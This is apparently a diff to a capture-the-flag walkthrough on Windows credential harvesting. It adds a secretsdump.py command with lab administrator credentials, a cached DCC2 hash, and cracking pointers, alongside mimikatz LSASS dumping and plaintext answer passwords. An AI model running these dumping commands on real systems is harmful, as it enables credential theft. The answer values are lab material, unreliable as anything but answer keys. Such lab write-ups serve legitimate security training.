@@ -39,9 +39,18 @@ Learn how credentials are stored, cached, and exposed in Windows and Active Dire
 
 > Elon Tusk's Gmail password is **MyTusksAreThaB3st**
 
-## What is svc-app's password?
+### What is svc-app's password?
 
 - `sekurlsa::logonpasswords` within mimikatz will dump credentials stored within LSASS memory
 
 > svc-app's password is **S3rv!c3Acc!**
 
+## Credential Harvesting with Secretsdump
+
+### What is drgonzo's password?
+
+- Use *secretsdump.py* from the [Impacket](https://github.com/fortra/impacket) python module
+    - `secretsdump.py WRK/Administrator:N3w34829DJdd?1@<target ip> -output local_dump` will dump the local hashes of the Domain Controller
+- drgonzo's password hash information is: `TRYHACKME.LOC/drgonzo:$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f:`
+- Crack using *hashcat* or *johntheripper*
+    - 
